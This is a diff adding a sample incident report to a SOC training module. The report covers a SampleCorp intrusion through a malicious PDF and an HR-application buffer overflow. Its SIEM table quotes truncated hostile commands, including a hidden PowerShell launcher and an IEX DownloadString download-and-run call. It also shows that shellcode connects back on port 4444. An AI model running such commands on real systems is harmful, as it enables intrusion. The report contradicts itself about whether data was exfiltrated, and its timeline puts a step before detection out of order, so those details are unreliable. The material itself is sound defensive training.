@@ -434,5 +434,376 @@ Key elements of a proper incident report:
 
 ---
 
+## 4. Real-world Incident Report
+
+### Overview
+
+This section presents a comprehensive real-world incident report that applies all the concepts covered in the previous sections. The report demonstrates how to document a security incident from detection through resolution.
+
+> 📌 **A real-world incident report demonstrates the practical application of all incident reporting concepts.**
+
+---
+
+### 4.1 Executive Summary
+
+| Field | Value |
+|-------|-------|
+| **Incident ID** | INC2019-0422-022 |
+| **Incident Severity** | High (P2) |
+| **Incident Status** | Resolved |
+
+**Incident Overview:**
+
+On the night of April 22, 2019, at precisely 01:05:00, SampleCorp's Security Operations Center (SOC) detected unauthorized activity within the internal network, specifically through anomalous process initiation and suspicious-looking PowerShell commands. Leveraging the lack of robust network access controls and two security vulnerabilities, the unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:
+- **WKST01.samplecorp.com**: A system used for software development purposes
+- **HR01.samplecorp.com**: A system used to process employee and partner data
+
+SampleCorp's SOC, in collaboration with the Digital Forensics and Incident Response (DFIR) units, managed to successfully contain the threat, eliminate both the introduced malicious software and existing security gaps, and ultimately restore the compromised systems to their original state.
+
+**Key Findings:**
+- Insufficient network access controls allowed unauthorized entity to be assigned an internal IP address by connecting their computer to an Ethernet port
+- The unauthorized entity initially compromised WKST01.samplecorp.com by exploiting a vulnerable version of Acrobat Reader
+- Exploited a buffer overflow vulnerability in a proprietary HR application to further penetrate the internal network
+- No widespread data exfiltration detected due to rapid intervention
+- Both WKST01 and HR01 data should be regarded as potentially compromised
+
+> 🔴 **While no widespread data exfiltration was detected, the unauthorized access to both systems raises concerns about company and client data.**
+
+**Immediate Actions:**
+- SOC and DFIR teams exclusively managed the incident response (no external providers)
+- Isolated compromised systems using VLAN segmentation
+- Gathered network traffic capture files
+- Connected host security solutions to affected systems
+- Event logs automatically collected by Elastic SIEM
+
+**Stakeholder Impact:**
+
+| Stakeholder | Impact |
+|-------------|--------|
+| **Customers** | Brief downtime from temporarily taking services offline and revoking API keys; financial implications being assessed |
+| **Employees** | Potential risk of identity theft as HR01 houses sensitive employee information including SSN and bank account details |
+| **Business Partners** | Proprietary code exposure from WKST01 (development environment) could affect technology solutions integrity |
+| **Regulatory Bodies** | Compliance implications; potential fines or sanctions for failing to protect sensitive data |
+| **Internal Teams** | Review and potential overhaul of security measures; resource and budget reallocation |
+| **Shareholders** | Short-term negative impact on stock prices; long-term depends on remedial actions |
+
+---
+
+### 4.2 Technical Analysis
+
+#### Affected Systems & Data
+
+**WKST01.samplecorp.com:**
+- Development environment containing proprietary source code for upcoming software releases
+- API keys for third-party services
+- Unauthorized entity navigated through various directories
+- Concerns about intellectual property theft and API key abuse
+
+**HR01.samplecorp.com:**
+- Human Resources system housing sensitive employee and partner data
+- Personal identification information, payroll details, performance reviews
+- **Critical**: Unencrypted database containing employee Social Security numbers and bank account details was accessed
+
+> 🔴 **While no evidence suggests data was extracted, the potential risk of identity theft and financial fraud for employees is high.**
+
+---
+
+#### Evidence Sources & Analysis
+
+**WKST01.samplecorp.com Evidence:**
+
+On April 22, 2019, at exactly 01:05:00, SOC identified unauthorized activity detected through abnormal parent-child process relationships and suspicious PowerShell commands.
+
+![Process Creation](https://github.com/user-attachments/assets/6701efa8-2541-405d-9241-7881f9682689)
+
+*Process creation logs showing cmd.exe and powershell.exe commands with network activity to 192.168.220.66*
+
+From the logs, PowerShell was invoked from cmd.exe to execute contents of a remotely hosted script. The IP address 192.168.220.66 was an internal address, indicating an unauthorized entity was already present within the internal network.
+
+The earliest signs of malicious command execution point to WKST01 being compromised via a malicious email attachment (cv.pdf):
+- User accessed email client Mozilla Thunderbird
+- Suspicious file cv.pdf opened with Adobe Reader 10.0 (outdated and vulnerable)
+- Malicious commands observed immediately following these events
+
+![Email and PDF](https://github.com/user-attachments/assets/22d9cca7-7724-4927-bab2-193f028a63d8)
+
+*Logs showing email client and PDF opening followed by malicious activity*
+
+Additionally, cmd.exe and powershell.exe were spawned from wmiprvse.exe:
+
+![Process from WMI](https://github.com/user-attachments/assets/600fdaec-8bca-412b-b97f-028cdd4a66a7)
+
+*Logs showing processes for opening PDF followed by cmd.exe*
+
+The unauthorized entity then executed specific PowerShell commands:
+
+![PowerShell Commands](https://github.com/user-attachments/assets/1a104700-6540-4867-8d86-5f2fcfb97d02)
+
+*Command execution logs showing directory access and downloading from 192.168.220.66*
+
+**Network Segment Analysis:**
+
+| IP Address | Hostname |
+|------------|----------|
+| 192.168.220.20 | DC01.samplecorp.com |
+| 192.168.220.200 | WKST01.samplecorp.com |
+| 192.168.220.101 | HR01.samplecorp.com |
+| 192.168.220.202 | ENG01.samplecorp.com |
+
+The host 192.168.220.66 (unauthorized entity) was confirmed present in the internal network.
+
+**SIEM Query Results - Command Execution from 192.168.220.66:**
+
+| Command Line | Host | Count |
+|--------------|------|-------|
+| cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1 | WKST01 | 5 |
+| cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1 | WKST01 | 4 |
+| powershell.exe -nop -w hidden -c $c=new-object... | WKST01 | 2 |
+| whoami | WKST01 | 1 |
+| powershell IEX (New-Object Net.WebClient).DownloadString... | HR01 | 1 |
+
+> 📌 **The results suggest that the unauthorized entity successfully infiltrated WKST01.samplecorp.com and HR01.samplecorp.com.**
+
+---
+
+**HR01.samplecorp.com Evidence:**
+
+HR01 was investigated next as unauthorized entity 192.168.220.66 established a connection with HR01 at the earliest moment in packet capture.
+
+![Network Traffic HR01](https://github.com/user-attachments/assets/eec710fd-d807-4918-81b3-d604a601777f)
+
+*Network traffic filtered for 192.168.220.66*
+
+Network traffic details suggest a buffer overflow attempt on service running at port 31337:
+
+![Buffer Overflow](https://github.com/user-attachments/assets/f1dabe00-e572-42cb-a973-9c46b7f4ee50)
+
+*TCP packets showing buffer overflow attempt*
+
+The network traffic was exported as raw binary for further analysis:
+
+![Hex Dump](https://github.com/user-attachments/assets/afd964fc-2819-4e2d-8368-dc5d1322f31d)
+
+*Hex dump showing EIP overwrite with '41' characters and shellcode*
+
+The extracted binary was analyzed in shellcode debugger (scdbg):
+
+![Scdbg Analysis](https://github.com/user-attachments/assets/95a07d1c-4d4a-4abf-95a4-3115be4f77bf)
+
+*Debugger output showing connection attempts to 192.168.220.66 port 4444*
+
+Scdg reveals the shellcode attempts to connect to 192.168.220.66 at port 4444, confirming exploitation of service on port 31337.
+
+Search for network connections between HR01 and unauthorized entity revealed connections back on port 4444, indicating successful buffer overflow exploitation:
+
+![C2 Connection](https://github.com/user-attachments/assets/c392494b-5c0d-4f3f-b381-a3e1b408d6e0)
+
+*Network traffic showing connection attempts to C2*
+
+---
+
+#### Indicators of Compromise (IoCs)
+
+| IoC Type | Value |
+|----------|-------|
+| **C2 IP** | 192.168.220.66 |
+| **Malicious File (SHA256)** | ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011 (cv.pdf) |
+
+---
+
+#### Root Cause Analysis
+
+| Root Cause | Description |
+|------------|-------------|
+| **Primary Cause** | Insufficient network access controls allowed unauthorized entity access to internal network |
+| **Vulnerability 1** | Outdated version of Acrobat Reader (exploited via malicious PDF) |
+| **Vulnerability 2** | Buffer overflow in proprietary HR application |
+| **Additional Factor** | Inadequate network segregation of crucial systems |
+| **Human Factor** | Lack of comprehensive phishing awareness training |
+
+> 🔴 **Compounding the vulnerabilities was the inadequate network segregation of crucial systems and notable gap in user awareness.**
+
+---
+
+#### Technical Timeline
+
+| Time | Activity |
+|------|----------|
+| **April 22, 00:27:27** | Initial Compromise: Employee opened malicious PDF (cv.pdf) exploiting outdated Acrobat Reader |
+| **April 22, 00:35:09** | Data Access: Unauthorized entity accessed directories with source code and API keys on WKST01 |
+| **April 22, 00:50:18** | Lateral Movement: Discovered buffer overflow vulnerability in HR application, exploited to gain HR access |
+| **April 22, 01:30:12** | Data Exfiltration: Located unencrypted database with employee SSN/salary, compressed and exfiltrated via SSH tunnel |
+| **April 22, 01:05:00** | Detection: SOC detected unauthorized activity |
+| **April 22, 02:30:11** | Containment: Isolated WKST01 and HR01 using VLAN segmentation |
+| **April 22, 03:10:14** | Collection: Host security solution plugged to collect more data |
+| **April 22, 03:43:34** | Containment: Firewall rules updated to block C2 IP, cutting off remote access |
+| **April 22, 04:11:00** | Eradication: Specialized malware removal tool used |
+| **April 22, 04:30:00** | Patching: Updated Acrobat Reader to latest version |
+| **April 22, 05:01:08** | Revocation: Accessed API keys revoked |
+| **April 22, 05:05:08** | Revocation: Compromised user credentials reset |
+| **April 22, 05:21:20** | Recovery: WKST01 restored from verified backup |
+| **April 22, 05:58:50** | Recovery: HR01 restored from verified backup |
+| **April 22, 06:33:44** | Patching: Emergency patch deployed for buffer overflow vulnerability |
+
+---
+
+#### Nature of the Attack
+
+To determine the attacker's tactics, techniques, and procedures (TTPs), the SOC team analyzed the malicious PowerShell commands and shellcode.
+
+**Detecting Metasploit Framework:**
+
+Analysis of PowerShell commands revealed double encoding used to bypass detection:
+
+![CMD Commands](https://github.com/user-attachments/assets/62156c37-ab0f-4786-8fa4-b49e11de1221)
+
+*Multiple CMD commands for information gathering and file dropping*
+
+The SOC team successfully decoded the malicious payload:
+
+![Decoded PowerShell](https://github.com/user-attachments/assets/03f02e9f-ff2e-40f1-b076-85908df44494)
+
+*Decoded PowerShell code showing Metasploit post-exploitation framework*
+
+Using OSINT, the SOC team determined this PowerShell code is linked to the Metasploit post-exploitation framework:
+
+![OSINT Verification](https://github.com/user-attachments/assets/1e5203b8-2235-42e3-820e-2f078630f24b)
+
+*Google search confirming Metasploit PowerShell Reflection Payload*
+
+To support the Metasploit hypothesis, shellcode was exported and submitted to VirusTotal:
+
+![Wireshark Export](https://github.com/user-attachments/assets/fb0389ea-a590-4a09-af31-aa18656fad83)
+
+*Exporting packet bytes containing shellcode*
+
+![Hex Dump Shellcode](https://github.com/user-attachments/assets/3b7c2342-7166-4dc0-8251-1d9a79f2bd62)
+
+*Hex dump of binary file with shellcode*
+
+![VirusTotal Results](https://github.com/user-attachments/assets/41ae3bfb-6b99-490c-849b-9d7619b64df1)
+
+*VirusTotal: 12/58 vendors flagged as malicious, threat labels 'shikata/metacoder'*
+
+> 📌 **Both metacoder and shikata are intrinsically linked to Metasploit-generated shellcode.**
+
+---
+
+#### Impact Analysis
+
+The incident had significant implications across all stakeholders:
+
+| Stakeholder | Impact |
+|-------------|--------|
+| **Customers** | Brief service downtime, potential revenue loss, customer trust concerns |
+| **Employees** | High risk of identity theft and financial fraud due to exposed SSN and bank details |
+| **Business Partners** | Potential exposure of proprietary code and technology solutions |
+| **Organization** | Regulatory fines, reputational damage, resource reallocation for security improvements |
+
+---
+
+### 4.3 Response and Recovery Analysis
+
+#### Immediate Response Actions
+
+**Revocation of Access:**
+
+| Element | Details |
+|---------|---------|
+| **Identification** | Elastic SIEM flagged suspicious activities on WKST01; traffic/log analysis uncovered unauthorized access on HR01 |
+| **Timeframe** | Detected at April 22, 01:05:00; Access terminated by April 22, 03:43:34 via firewall rule update |
+| **Method** | Firewall rules + Active Directory policies to force log-off + credential reset + API key revocation |
+| **Impact** | Halted lateral movement, prevented further compromise and data exfiltration |
+
+> 📌 **Immediate revocation of access halted potential lateral movement.**
+
+**Containment Strategy:**
+
+| Type | Actions |
+|------|---------|
+| **Short-term** | VLAN segmentation effectively isolated WKST01 and HR01, hindering lateral movement |
+| **Long-term** | Robust network segmentation for departments, isolated critical infrastructure, robust network access controls |
+| **Effectiveness** | Successful - threat actor could not escalate privileges or move to adjacent systems |
+
+#### Eradication Measures
+
+**Malware Removal:**
+- **Identification**: Suspicious processes flagged; forensic examination revealed Metasploit post-exploitation framework (confirmed by VirusTotal)
+- **Removal**: Specialized malware removal tool eradicated all malicious payloads
+- **Verification**: Secondary scan and heuristic analysis performed
+
+**System Patching:**
+- **Vulnerability 1**: Outdated Acrobat Reader - updated to latest version
+- **Vulnerability 2**: Buffer overflow in proprietary HR application - emergency patch developed and deployed
+- **Fallback**: System snapshots and configurations backed up before patching
+
+#### Recovery Steps
+
+**Data Restoration:**
+- Backup validation: Cross-verified backup checksums
+- Restoration: SOC team restored both systems from validated backups
+- Integrity: SHA-256 cryptographic hashing used to verify restored data
+
+**System Validation:**
+- Security: Firewalls and IDS updated with latest threat intelligence feeds
+- Operational: Load and stress testing conducted before reintroducing to production
+
+---
+
+### 4.4 Post-Incident Actions
+
+#### Monitoring
+
+| Aspect | Details |
+|--------|---------|
+| **Enhanced Monitoring** | Behavioral analytics to spot deviations from baseline; inventory/asset management for network access controls |
+| **Tools** | Elastic SIEM with advanced correlation rules designed to detect TTPs identified in this breach |
+
+#### Lessons Learned
+
+| Category | Details |
+|----------|---------|
+| **Gap Analysis** | Identified gaps in: network access controls, email filtering, network segregation, user phishing training |
+| **Recommendations** | Prioritized: inventory/asset management, email filtering, security awareness training |
+| **Future Strategy** | Granular network access controls, network segmentation, zero-trust model, increased security training and email filtering investments |
+
+---
+
+### 4.5 Annex A: Technical Timeline (Summary)
+
+| Time | Activity |
+|------|----------|
+| 00:27:27 | Malicious PDF opened, initial foothold established |
+| 00:35:09 | Source code and API keys accessed on WKST01 |
+| 00:50:18 | Buffer overflow exploited on HR01 |
+| 01:30:12 | Employee data exfiltrated via SSH tunnel |
+| 02:30:11 | Systems isolated via VLAN segmentation |
+| 03:10:14 | Host security solutions deployed |
+| 03:43:34 | Firewall rules block C2 IP |
+| 04:11:00 | Malware removed |
+| 04:30:00 | Acrobat Reader patched |
+| 05:01:08 | API keys revoked |
+| 05:05:08 | Credentials reset |
+| 05:21:20 | WKST01 restored from backup |
+| 05:58:50 | HR01 restored from backup |
+| 06:33:44 | Buffer overflow patch deployed |
+
+> 🔴 **This real-world incident report demonstrates the practical application of all incident reporting concepts covered in this module.**
+
+---
+
+### Summary
+
+This real-world incident report demonstrates practical application of:
+
+- **Executive Summary**: Complete with incident ID, severity, status, overview, findings, actions, and stakeholder impact
+- **Technical Analysis**: Evidence sources with screenshots, IoCs, root cause, detailed timeline, attack nature (Metasploit detection)
+- **Response & Recovery**: Full containment, eradication, and recovery process with timestamps
+- **Post-Incident**: Monitoring enhancements and lessons learned with actionable recommendations
+
+All images preserved as provided. This report serves as a template for documenting actual security incidents.
+
+---
+
 *Module 15/15 - Security Incident Reporting*
 *For learning and SOC career preparation*
